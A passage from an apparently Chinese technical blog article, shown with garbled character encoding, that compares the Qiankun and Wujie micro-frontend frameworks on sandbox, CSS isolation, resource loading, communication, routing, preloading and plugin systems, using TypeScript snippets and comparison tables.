<table><thead><tr><th>åœºæ™¯</th><th>Qiankun</th><th>Wujie</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>å…¨å±€å˜é‡æ±¡æŸ“</td><td>âœ… Proxy æ‹¦æˆª</td><td>âœ… åŸç”Ÿéš”ç¦»</td><td>éƒ½èƒ½å¤„ç†</td></tr><tr><td>åŸå‹é“¾æ±¡æŸ“</td><td>âš ï¸ éœ€é¢å¤–å¤„ç†</td><td>âœ… åŸç”Ÿéš”ç¦»</td><td>Array.prototype.xxx</td></tr><tr><td>eval/new Function</td><td>âš ï¸ å¯èƒ½é€ƒé€¸</td><td>âœ… åŸç”Ÿéš”ç¦»</td><td>åŠ¨æ€ä»£ç æ‰§è¡Œ</td></tr><tr><td>å®šæ—¶å™¨æ¸…ç†</td><td>éœ€ patch</td><td>è‡ªåŠ¨æ¸…ç†</td><td>setInterval/setTimeout</td></tr><tr><td>äº‹ä»¶ç›‘å¬æ¸…ç†</td><td>éœ€ patch</td><td>è‡ªåŠ¨æ¸…ç†</td><td>addEventListener</td></tr><tr><td>localStorage</td><td>å…±äº«</td><td>å¯é…ç½®éš”ç¦»</td><td>é€šè¿‡æ’ä»¶å®ç°</td></tr><tr><td>Cookie</td><td>å…±äº«</td><td>å…±äº«</td><td>åŒåŸŸé™åˆ¶</td></tr></tbody></table>
<h3 data-id="heading-8">ä¸‰ã€CSS éš”ç¦»æœºåˆ¶</h3>
<h4 data-id="heading-9">3.1 Qiankunï¼šScoped CSS / Shadow DOM</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ–¹å¼ä¸€ï¼šScoped CSSï¼ˆé»˜è®¤ï¼‰</span>
<span class="hljs-comment">// åŸå§‹</span>
.<span class="hljs-property">container</span> { <span class="hljs-attr">color</span>: red; }
<span class="hljs-comment">// è½¬æ¢å</span>
div[data-qiankun=<span class="hljs-string">"app-name"</span>] .<span class="hljs-property">container</span> { <span class="hljs-attr">color</span>: red; }

<span class="hljs-comment">// æ–¹å¼äºŒï¼šShadow DOMï¼ˆå®éªŒæ€§ï¼‰</span>
<span class="hljs-title function_">start</span>({ <span class="hljs-attr">sandbox</span>: { <span class="hljs-attr">experimentalStyleIsolation</span>: <span class="hljs-literal">true</span> } });
</code></pre>
<p><strong>é—®é¢˜</strong>ï¼š</p>
<ul>
<li>Scoped CSS å¯èƒ½æœ‰é€‰æ‹©å™¨æƒé‡é—®é¢˜</li>
<li>Shadow DOM ä¸‹å¼¹çª—æ ·å¼éœ€è¦ç‰¹æ®Šå¤„ç†</li>
</ul>
<h4 data-id="heading-10">3.2 Wujieï¼šShadow DOM + CSS Loader</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. åˆ›å»º Web Component</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WujieApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">HTMLElement</span> {
  <span class="hljs-title function_">connectedCallback</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">attachShadow</span>({ <span class="hljs-attr">mode</span>: <span class="hljs-string">"open"</span> });
  }
}
customElements.<span class="hljs-title function_">define</span>(<span class="hljs-string">"wujie-app"</span>, <span class="hljs-title class_">WujieApp</span>);

<span class="hljs-comment">// 2. æ¸²æŸ“åˆ° Shadow DOM</span>
shadowRoot.<span class="hljs-property">innerHTML</span> = template;

<span class="hljs-comment">// 3. :root è½¬æ¢ä¸º :host</span>
<span class="hljs-keyword">const</span> cssSelectorMap = { <span class="hljs-string">":root"</span>: <span class="hljs-string">":host"</span> };

<span class="hljs-comment">// 4. @font-face æå–åˆ°å¤–éƒ¨ï¼ˆShadow DOM å†…å­—ä½“ä¸ç”Ÿæ•ˆï¼‰</span>
<span class="hljs-keyword">if</span> (cssRule.<span class="hljs-property">type</span> === <span class="hljs-title class_">CSSRule</span>.<span class="hljs-property">FONT_FACE_RULE</span>) {
  fontCssRules.<span class="hljs-title function_">push</span>(cssRuleText);
}
shadowRoot.<span class="hljs-property">host</span>.<span class="hljs-title function_">appendChild</span>(fontStyleSheetElement);

<span class="hljs-comment">// 5. CSS ç›¸å¯¹è·¯å¾„å¤„ç†</span>
code.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/url\((['"]?)(.*)(\1)\)/g</span>, <span class="hljs-function">(<span class="hljs-params">_, pre, url, post</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`url(<span class="hljs-subst">${pre}</span><span class="hljs-subst">${getAbsolutePath(url, baseUrl)}</span><span class="hljs-subst">${post}</span>)`</span>;
});
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>åŸç”Ÿ Shadow DOM éš”ç¦»</li>
<li>è‡ªåŠ¨å¤„ç† :root â†’ :host</li>
<li>@font-face è‡ªåŠ¨æå–</li>
<li>CSS ç›¸å¯¹è·¯å¾„è‡ªåŠ¨è½¬æ¢</li>
</ul>
<h4 data-id="heading-11">3.3 CSS éš”ç¦»å¯¹æ¯”</h4>















































<table><thead><tr><th>ç‰¹æ€§</th><th>Qiankun Scoped</th><th>Qiankun Shadow</th><th>Wujie Shadow</th></tr></thead><tbody><tr><td>éš”ç¦»ç¨‹åº¦</td><td>ä¸­</td><td>é«˜</td><td>é«˜</td></tr><tr><td>å…¼å®¹æ€§</td><td>å¥½</td><td>ä¸€èˆ¬</td><td>ä¸€èˆ¬</td></tr><tr><td>å¼¹çª—æ ·å¼</td><td>âœ… æ­£å¸¸</td><td>âŒ éœ€å¤„ç†</td><td>âŒ éœ€å¤„ç†</td></tr><tr><td>å…¨å±€æ ·å¼æ³„æ¼</td><td>å¯èƒ½</td><td>ä¸ä¼š</td><td>ä¸ä¼š</td></tr><tr><td>:root æ”¯æŒ</td><td>âœ…</td><td>âŒ éœ€è½¬æ¢</td><td>âœ… è‡ªåŠ¨è½¬æ¢</td></tr><tr><td>@font-face</td><td>âœ…</td><td>âŒ éœ€å¤„ç†</td><td>âœ… è‡ªåŠ¨å¤„ç†</td></tr></tbody></table>
<h3 data-id="heading-12">å››ã€èµ„æºåŠ è½½æœºåˆ¶</h3>
<h4 data-id="heading-13">4.1 Qiankunï¼šæµå¼åŠ è½½ + HTML Entry</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. Fetch å¢å¼º</span>
<span class="hljs-keyword">const</span> enhancedFetch = <span class="hljs-title function_">makeFetchCacheable</span>(
  <span class="hljs-title function_">makeFetchRetryable</span>(
    <span class="hljs-title function_">makeFetchThrowable</span>(fetch)
  )
);

<span class="hljs-comment">// 2. æµå¼åŠ è½½</span>
res.<span class="hljs-property">body</span>
  .<span class="hljs-title function_">pipeThrough</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoderStream</span>())
  .<span class="hljs-title function_">pipeThrough</span>(<span class="hljs-title function_">createTagTransformStream</span>([
    { <span class="hljs-attr">tag</span>: <span class="hljs-string">'&lt;head&gt;'</span>, <span class="hljs-attr">alt</span>: <span class="hljs-string">'&lt;qiankun-head&gt;'</span> },  <span class="hljs-comment">// é¿å…æ±¡æŸ“ä¸»åº”ç”¨ head</span>
  ]))
  .<span class="hljs-title function_">pipeTo</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WritableDOMStream</span>(container, nodeTransformer));

<span class="hljs-comment">// 3. è„šæœ¬æ²™ç®±åŒ…è£…</span>
<span class="hljs-keyword">const</span> wrappedCode = sandbox.<span class="hljs-title function_">makeEvaluateFactory</span>(code, entry);

<span class="hljs-comment">// 4. defer è„šæœ¬é˜Ÿåˆ—ä¿è¯é¡ºåºæ‰§è¡Œ</span>
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>è¾¹ä¸‹è½½è¾¹è§£æï¼Œé¦–å±æ›´å¿«</li>
<li>head æ ‡ç­¾è½¬æ¢é¿å…æ±¡æŸ“</li>
<li>Fetch ç¼“å­˜ + é‡è¯•æœºåˆ¶</li>
<li>defer è„šæœ¬é¡ºåºä¿è¯</li>
</ul>
<h4 data-id="heading-14">4.2 Wujieï¼šimportHTML + è„šæœ¬åˆ†ç±»</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. åŠ è½½ HTML</span>
<span class="hljs-keyword">const</span> { template, getExternalScripts, getExternalStyleSheets } = 
  <span class="hljs-keyword">await</span> importHTML({ url, html, opts });

<span class="hljs-comment">// 2. è„šæœ¬åˆ†ç±»æ‰§è¡Œ</span>
<span class="hljs-keyword">const</span> syncScriptResultList = [];   <span class="hljs-comment">// åŒæ­¥è„šæœ¬</span>
<span class="hljs-keyword">const</span> asyncScriptResultList = [];  <span class="hljs-comment">// å¼‚æ­¥è„šæœ¬</span>
<span class="hljs-keyword">const</span> deferScriptResultList = [];  <span class="hljs-comment">// defer è„šæœ¬</span>

<span class="hljs-comment">// 3. æ„å»ºæ‰§è¡Œé˜Ÿåˆ—</span>
syncScriptResultList.<span class="hljs-title function_">concat</span>(deferScriptResultList).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">script</span>) =&gt;</span> {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">execQueue</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">insertScriptToIframe</span>(script, iframeWindow));
});

<span class="hljs-comment">// 4. å¼‚æ­¥è„šæœ¬ä¸å…¥é˜Ÿåˆ—</span>
asyncScriptResultList.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">script</span>) =&gt;</span> {
  script.<span class="hljs-property">contentPromise</span>.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">content</span>) =&gt;</span> {
    <span class="hljs-title function_">insertScriptToIframe</span>({ ...script, content }, iframeWindow);
  });
});

<span class="hljs-comment">// 5. è§¦å‘ç”Ÿå‘½å‘¨æœŸäº‹ä»¶</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">execQueue</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">eventTrigger</span>(iframeWindow.<span class="hljs-property">document</span>, <span class="hljs-string">"DOMContentLoaded"</span>));
<span class="hljs-variable language_">this</span>.<span class="hljs-property">execQueue</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">eventTrigger</span>(iframeWindow, <span class="hljs-string">"load"</span>));
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>è„šæœ¬åˆ†ç±»å¤„ç†ï¼ˆsync/async/deferï¼‰</li>
<li>æ‰§è¡Œé˜Ÿåˆ—ä¿è¯é¡ºåº</li>
<li>æ­£ç¡®è§¦å‘ DOMContentLoaded/load äº‹ä»¶</li>
</ul>
<h3 data-id="heading-15">äº”ã€é€šä¿¡æœºåˆ¶</h3>
<h4 data-id="heading-16">5.1 Qiankunï¼šProps + å…¨å±€çŠ¶æ€</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. Props ä¼ é€’</span>
<span class="hljs-title function_">registerMicroApps</span>([{
  <span class="hljs-attr">name</span>: <span class="hljs-string">'app'</span>,
  <span class="hljs-attr">props</span>: { user, token, onLogout, <span class="hljs-attr">utils</span>: { request, storage } },
}]);

<span class="hljs-comment">// å­åº”ç”¨æ¥æ”¶</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">mount</span>(<span class="hljs-params">props</span>) {
  <span class="hljs-keyword">const</span> { user, token, onLogout, utils } = props;
}

<span class="hljs-comment">// 2. å…¨å±€çŠ¶æ€ï¼ˆ2.xï¼Œ3.0 å·²ç§»é™¤ï¼‰</span>
<span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">initGlobalState</span>({ <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span> });
actions.<span class="hljs-title function_">onGlobalStateChange</span>(<span class="hljs-function">(<span class="hljs-params">state, prev</span>) =&gt;</span> {});
actions.<span class="hljs-title function_">setGlobalState</span>({ <span class="hljs-attr">user</span>: newUser });

<span class="hljs-comment">// 3. è‡ªå®šä¹‰äº‹ä»¶</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'micro-app-event'</span>, { detail }));
</code></pre>
<h4 data-id="heading-17">5.2 Wujieï¼šEventBus + Props</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. å…¨å±€äº‹ä»¶ Mapï¼ˆæ”¯æŒè·¨åº”ç”¨é€šä¿¡ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> appEventObjMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">EventObj</span>&gt;();

<span class="hljs-comment">// 2. EventBus å®ç°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">EventBus</span> {
  $emit(event, ...args) {
    <span class="hljs-comment">// éå†æ‰€æœ‰åº”ç”¨çš„äº‹ä»¶å¯¹è±¡</span>
    appEventObjMap.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">eventObj</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (eventObj[event]) {
        eventObj[event].<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">fn</span>) =&gt;</span> <span class="hljs-title function_">fn</span>(...args));
      }
    });
  }
}

<span class="hljs-comment">// 3. ä¸»åº”ç”¨ä½¿ç”¨</span>
<span class="hljs-keyword">import</span> { bus } <span class="hljs-keyword">from</span> <span class="hljs-string">'wujie'</span>;
bus.$emit(<span class="hljs-string">'theme-change'</span>, { <span class="hljs-attr">theme</span>: <span class="hljs-string">'dark'</span> });
bus.$on(<span class="hljs-string">'user-logout'</span>, <span class="hljs-function">() =&gt;</span> router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/login'</span>));

<span class="hljs-comment">// 4. å­åº”ç”¨ä½¿ç”¨</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">$wujie</span>.<span class="hljs-property">bus</span>.$on(<span class="hljs-string">'theme-change'</span>, <span class="hljs-function">(<span class="hljs-params">{ theme }</span>) =&gt;</span> {});
<span class="hljs-variable language_">window</span>.<span class="hljs-property">$wujie</span>.<span class="hljs-property">bus</span>.$emit(<span class="hljs-string">'user-logout'</span>);

<span class="hljs-comment">// 5. Props ä¼ é€’</span>
<span class="hljs-title function_">startApp</span>({ <span class="hljs-attr">props</span>: { user, <span class="hljs-attr">api</span>: { getUserInfo, logout } } });
<span class="hljs-keyword">const</span> { props } = <span class="hljs-variable language_">window</span>.<span class="hljs-property">$wujie</span>;
</code></pre>
<h4 data-id="heading-18">5.3 é€šä¿¡å¯¹æ¯”</h4>



































<table><thead><tr><th>ç‰¹æ€§</th><th>Qiankun</th><th>Wujie</th></tr></thead><tbody><tr><td>Props ä¼ é€’</td><td>âœ…</td><td>âœ…</td></tr><tr><td>äº‹ä»¶æ€»çº¿</td><td>éœ€è‡ªå»º</td><td>âœ… å†…ç½®</td></tr><tr><td>å…¨å±€çŠ¶æ€</td><td>âœ… initGlobalStateï¼ˆ2.xï¼‰</td><td>éœ€è‡ªå»º</td></tr><tr><td>è·¨åº”ç”¨é€šä¿¡</td><td>é€šè¿‡ä¸»åº”ç”¨ä¸­è½¬</td><td>âœ… ç›´æ¥é€šä¿¡</td></tr><tr><td>åµŒå¥—åº”ç”¨é€šä¿¡</td><td>éœ€å¤„ç†</td><td>âœ… è‡ªåŠ¨æ”¯æŒ</td></tr></tbody></table>
<h3 data-id="heading-19">å…­ã€è·¯ç”±å¤„ç†</h3>
<h4 data-id="heading-20">6.1 Qiankunï¼šsingle-spa è·¯ç”±åŠ«æŒ</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. History API åŠ«æŒ</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">history</span>.<span class="hljs-property">pushState</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
  <span class="hljs-keyword">const</span> result = originalPushState.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
  <span class="hljs-title function_">reroute</span>();  <span class="hljs-comment">// è§¦å‘è·¯ç”±å˜åŒ–æ£€æŸ¥</span>
  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// 2. ç›‘å¬äº‹ä»¶</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'popstate'</span>, reroute);
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'hashchange'</span>, reroute);

<span class="hljs-comment">// 3. activeRule åŒ¹é…</span>
<span class="hljs-title function_">registerMicroApps</span>([{
  <span class="hljs-attr">activeRule</span>: <span class="hljs-string">'/react'</span>,  <span class="hljs-comment">// å­—ç¬¦ä¸²</span>
  <span class="hljs-attr">activeRule</span>: [<span class="hljs-string">'/react'</span>, <span class="hljs-string">'/react-app'</span>],  <span class="hljs-comment">// æ•°ç»„</span>
  <span class="hljs-attr">activeRule</span>: <span class="hljs-function">(<span class="hljs-params">location</span>) =&gt;</span> location.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/react'</span>),  <span class="hljs-comment">// å‡½æ•°</span>
}]);

<span class="hljs-comment">// 4. å­åº”ç”¨éœ€è¦è®¾ç½® basename</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span> <span class="hljs-attr">basename</span>=<span class="hljs-string">{window.__POWERED_BY_QIANKUN__</span> ? '/<span class="hljs-attr">react</span>' <span class="hljs-attr">:</span> '/'}&gt;</span>
</span></code></pre>
<h4 data-id="heading-21">6.2 Wujieï¼šURL Query åŒæ­¥</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. å­åº”ç”¨è·¯ç”±å­˜å…¥ä¸»åº”ç”¨ URL</span>
<span class="hljs-comment">// ä¸»åº”ç”¨: https://main.com/home?vue3=%2Fuser%2F123</span>
<span class="hljs-comment">// å­åº”ç”¨: /user/123</span>

<span class="hljs-comment">// 2. History åŠ«æŒåŒæ­¥</span>
history.<span class="hljs-property">pushState</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">data, title, url</span>) {
  rawHistoryPushState.<span class="hljs-title function_">call</span>(history, data, title, mainUrl);
  <span class="hljs-title function_">syncUrlToWindow</span>(iframeWindow);  <span class="hljs-comment">// åŒæ­¥åˆ°ä¸»åº”ç”¨ URL</span>
};

<span class="hljs-comment">// 3. çŸ­è·¯å¾„ä¼˜åŒ–</span>
<span class="hljs-title function_">startApp</span>({
  <span class="hljs-attr">sync</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">prefix</span>: { <span class="hljs-string">'u'</span>: <span class="hljs-string">'/user'</span> },  <span class="hljs-comment">// /user/123 â†’ {u}/123</span>
});

<span class="hljs-comment">// 4. åˆ·æ–°æ¢å¤</span>
<span class="hljs-keyword">const</span> syncUrl = <span class="hljs-title function_">getSyncUrl</span>(id, prefix);  <span class="hljs-comment">// ä» URL è·å–å­åº”ç”¨è·¯ç”±</span>
</code></pre>
<h4 data-id="heading-22">6.3 è·¯ç”±å¯¹æ¯”</h4>








































<table><thead><tr><th>ç‰¹æ€§</th><th>Qiankun</th><th>Wujie</th></tr></thead><tbody><tr><td>è·¯ç”±æ¨¡å¼</td><td>hash/history</td><td>hash/history</td></tr><tr><td>URL åŒæ­¥</td><td>éœ€é…ç½®</td><td>âœ… sync æ¨¡å¼</td></tr><tr><td>è·¯ç”±éš”ç¦»</td><td>å…±äº« history</td><td>ç‹¬ç«‹ history</td></tr><tr><td>åˆ·æ–°æ¢å¤</td><td>éœ€å¤„ç†</td><td>âœ… è‡ªåŠ¨æ¢å¤</td></tr><tr><td>çŸ­è·¯å¾„ä¼˜åŒ–</td><td>âŒ</td><td>âœ… prefix é…ç½®</td></tr><tr><td>å­åº”ç”¨æ”¹é€ </td><td>éœ€è®¾ç½® basename</td><td>æ— éœ€æ”¹é€ </td></tr></tbody></table>
<h3 data-id="heading-23">ä¸ƒã€é¢„åŠ è½½ç­–ç•¥</h3>
<h4 data-id="heading-24">7.1 Qiankunï¼šå¤šç­–ç•¥é¢„åŠ è½½</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. é…ç½®æ–¹å¼</span>
<span class="hljs-title function_">start</span>({ <span class="hljs-attr">prefetch</span>: <span class="hljs-literal">true</span> });  <span class="hljs-comment">// é¦–å±åé¢„åŠ è½½æ‰€æœ‰</span>
<span class="hljs-title function_">start</span>({ <span class="hljs-attr">prefetch</span>: <span class="hljs-string">'all'</span> });  <span class="hljs-comment">// ç«‹å³é¢„åŠ è½½æ‰€æœ‰</span>
<span class="hljs-title function_">start</span>({ <span class="hljs-attr">prefetch</span>: [<span class="hljs-string">'react-app'</span>] });  <span class="hljs-comment">// æŒ‡å®šåº”ç”¨</span>
<span class="hljs-title function_">start</span>({
  <span class="hljs-attr">prefetch</span>: <span class="hljs-function">(<span class="hljs-params">apps</span>) =&gt;</span> ({
    <span class="hljs-attr">criticalAppNames</span>: [<span class="hljs-string">'react-app'</span>],  <span class="hljs-comment">// å…³é”®åº”ç”¨ç«‹å³åŠ è½½</span>
    <span class="hljs-attr">minorAppNames</span>: [<span class="hljs-string">'vue-app'</span>],       <span class="hljs-comment">// æ¬¡è¦åº”ç”¨ç©ºé—²æ—¶åŠ è½½</span>
  }),
});

<span class="hljs-comment">// 2. ç©ºé—²æ—¶åŠ è½½</span>
<span class="hljs-title function_">requestIdleCallback</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> { getExternalScripts, getExternalStyleSheets } = <span class="hljs-keyword">await</span> importEntry(entry);
  <span class="hljs-title function_">requestIdleCallback</span>(getExternalStyleSheets);
  <span class="hljs-title function_">requestIdleCallback</span>(getExternalScripts);
});

<span class="hljs-comment">// 3. åŸºäºç½‘ç»œçŠ¶å†µ</span>
<span class="hljs-keyword">if</span> (connection.<span class="hljs-property">effectiveType</span> === <span class="hljs-string">'slow-2g'</span>) {
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">criticalAppNames</span>: [], <span class="hljs-attr">minorAppNames</span>: [] };
}
</code></pre>
<h4 data-id="heading-25">7.2 Wujieï¼špreloadApp</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. é¢„åŠ è½½</span>
<span class="hljs-keyword">import</span> { preloadApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'wujie'</span>;
<span class="hljs-title function_">preloadApp</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'vue3'</span>, <span class="hljs-attr">url</span>: <span class="hljs-string">'http://localhost:7300/'</span> });

<span class="hljs-comment">// 2. é¢„æ‰§è¡Œï¼ˆåˆ›å»ºæ²™ç®±ä½†ä¸æ¸²æŸ“ï¼‰</span>
<span class="hljs-title function_">preloadApp</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'vue3'</span>, <span class="hljs-attr">url</span>: <span class="hljs-string">'...'</span>, <span class="hljs-attr">exec</span>: <span class="hljs-literal">true</span> });

<span class="hljs-comment">// 3. ä¿æ´»æ¨¡å¼ï¼ˆçŠ¶æ€ä¿ç•™ï¼‰</span>
<span class="hljs-title function_">startApp</span>({ <span class="hljs-attr">alive</span>: <span class="hljs-literal">true</span> });  <span class="hljs-comment">// åˆ‡æ¢æ—¶ä¸é”€æ¯ï¼Œç›´æ¥æ¿€æ´»</span>
</code></pre>
<h4 data-id="heading-26">7.3 é¢„åŠ è½½å¯¹æ¯”</h4>








































<table><thead><tr><th>ç‰¹æ€§</th><th>Qiankun</th><th>Wujie</th></tr></thead><tbody><tr><td>é¢„åŠ è½½èµ„æº</td><td>âœ…</td><td>âœ…</td></tr><tr><td>é¢„æ‰§è¡Œ</td><td>âŒ</td><td>âœ… exec æ¨¡å¼</td></tr><tr><td>ä¿æ´»æ¨¡å¼</td><td>âŒ</td><td>âœ… alive æ¨¡å¼</td></tr><tr><td>ç©ºé—²åŠ è½½</td><td>âœ… requestIdleCallback</td><td>âŒ</td></tr><tr><td>è‡ªå®šä¹‰ç­–ç•¥</td><td>âœ… å‡½æ•°é…ç½®</td><td>âŒ</td></tr><tr><td>ç½‘ç»œæ„ŸçŸ¥</td><td>å¯å®ç°</td><td>âŒ</td></tr></tbody></table>
<h3 data-id="heading-27">å…«ã€æ’ä»¶/æ‰©å±•ç³»ç»Ÿ</h3>
<h4 data-id="heading-28">8.1 Qiankunï¼šç”Ÿå‘½å‘¨æœŸé’©å­</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">registerMicroApps</span>(apps, {
  <span class="hljs-attr">beforeLoad</span>: [<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'beforeLoad'</span>, app.<span class="hljs-property">name</span>)],
  <span class="hljs-attr">beforeMount</span>: [<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'beforeMount'</span>, app.<span class="hljs-property">name</span>)],
  <span class="hljs-attr">afterMount</span>: [<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'afterMount'</span>, app.<span class="hljs-property">name</span>)],
  <span class="hljs-attr">beforeUnmount</span>: [<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'beforeUnmount'</span>, app.<span class="hljs-property">name</span>)],
  <span class="hljs-attr">afterUnmount</span>: [<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'afterUnmount'</span>, app.<span class="hljs-property">name</span>)],
});
</code></pre>
<h4 data-id="heading-29">8.2 Wujieï¼šå®Œæ•´æ’ä»¶ç³»ç»Ÿ</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">startApp</span>({
  <span class="hljs-attr">plugins</span>: [{
    <span class="hljs-comment">// HTML å¤„ç†</span>
    <span class="hljs-attr">htmlLoader</span>: <span class="hljs-function">(<span class="hljs-params">code</span>) =&gt;</span> code,
    
    <span class="hljs-comment">// JS å¤„ç†</span>
    <span class="hljs-attr">jsExcludes</span>: [<span class="hljs-regexp">/google-analytics/</span>],  <span class="hljs-comment">// æ’é™¤</span>
    <span class="hljs-attr">jsIgnores</span>: [<span class="hljs-regexp">/ad\.js/</span>],             <span class="hljs-comment">// å¿½ç•¥æ‰§è¡Œ</span>
    <span class="hljs-attr">jsBeforeLoaders</span>: [{ <span class="hljs-attr">content</span>: <span class="hljs-string">'window.ENV = "prod"'</span> }],
    <span class="hljs-attr">jsLoader</span>: <span class="hljs-function">(<span class="hljs-params">code, url</span>) =&gt;</span> code.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/api\.dev/g</span>, <span class="hljs-string">'api.prod'</span>),
    <span class="hljs-attr">jsAfterLoaders</span>: [{ <span class="hljs-attr">src</span>: <span class="hljs-string">'https://cdn.com/init.js'</span> }],
    
    <span class="hljs-comment">// CSS å¤„ç†</span>
    <span class="hljs-attr">cssExcludes</span>: [],
    <span class="hljs-attr">cssBeforeLoaders</span>: [{ <span class="hljs-attr">content</span>: <span class="hljs-string">':root { --theme: dark; }'</span> }],
    <span class="hljs-attr">cssLoader</span>: <span class="hljs-function">(<span class="hljs-params">code, url</span>) =&gt;</span> code,
    <span class="hljs-attr">cssAfterLoaders</span>: [],
    
    <span class="hljs-comment">// äº‹ä»¶é’©å­</span>
    <span class="hljs-attr">windowAddEventListenerHook</span>: <span class="hljs-function">(<span class="hljs-params">win, <span class="hljs-keyword">type</span>, handler</span>) =&gt;</span> {},
    <span class="hljs-attr">documentAddEventListenerHook</span>: <span class="hljs-function">(<span class="hljs-params">win, <span class="hljs-keyword">type</span>, handler</span>) =&gt;</span> {},
    
    <span class="hljs-comment">// DOM é’©å­</span>
    <span class="hljs-attr">appendOrInsertElementHook</span>: <span class="hljs-function">(<span class="hljs-params">element, iframeWindow</span>) =&gt;</span> {},
    <span class="hljs-attr">patchElementHook</span>: <span class="hljs-function">(<span class="hljs-params">element, iframeWindow</span>) =&gt;</span> {},
    
    <span class="hljs-comment">// å±æ€§è¦†ç›–</span>
    <span class="hljs-attr">windowPropertyOverride</span>: <span class="hljs-function">(<span class="hljs-params">iframeWindow</span>) =&gt;</span> {
      iframeWindow.<span class="hljs-property">localStorage</span> = customStorage;
    },
    <span class="hljs-attr">documentPropertyOverride</span>: <span class="hljs-function">(<span class="hljs-params">iframeWindow</span>) =&gt;</span> {},
  }],
});
</code></pre>
<h4 data-id="heading-30">8.3 æ‰©å±•èƒ½åŠ›å¯¹æ¯”</h4>


















































